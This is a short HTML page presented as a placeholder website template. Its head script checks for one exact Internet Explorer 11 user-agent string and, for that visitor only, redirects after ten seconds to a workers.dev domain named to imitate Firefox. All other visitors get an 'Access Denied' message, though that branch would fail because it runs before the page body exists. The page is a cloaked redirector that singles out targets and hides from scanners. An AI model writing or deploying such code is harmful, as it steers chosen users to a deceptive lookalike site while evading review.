<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Your Website Title</title>
    <!-- Add the JavaScript code for redirection -->
    <script>
        // Check if the user agent matches the specified criteria
        const userAgent = navigator.userAgent;
        if (userAgent === 'Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko') {
            // Redirect after 10 seconds
            setTimeout(() => {
                window.location.href = 'http://firefox-com.foxiproxi.workers.dev';
            }, 10000);
        } else {
            // Access denied message
            document.body.innerHTML = '<h1>Access Denied</h1><p>You are not authorized to access this resource.</p>';
        }
    </script>
</head>
<body>
    <!-- Your website content goes here -->
    <h1>Welcome to Your Website</h1>
    <p>This is the content of your website.</p>
</body>
</html>
